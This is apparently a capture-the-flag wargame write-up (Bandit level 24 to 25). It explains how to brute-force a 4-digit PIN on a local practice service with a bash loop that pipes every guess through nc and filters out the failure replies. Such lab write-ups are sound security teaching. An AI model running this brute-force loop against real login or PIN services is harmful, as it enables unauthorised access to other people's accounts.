# Bandit Level 24 -> 25

## Goal

Brute-force a 4-digit PIN on a network service.

## Key Concept

Scripted brute-force attacks.

## Solution

The service on port 30002 requires the current password plus a 4-digit PIN.

Brute-force all combinations:

```bash
for i in {0000..9999}; do
  echo "<password_level_24> $i"
done | nc localhost 30002 | grep -v "Wrong"
```

This tries all PINs from 0000 to 9999 and filters out failure messages.

## Why This Works

With only 10,000 possible combinations (0000-9999), brute-forcing is practical. The script generates all possibilities and pipes them to the service.
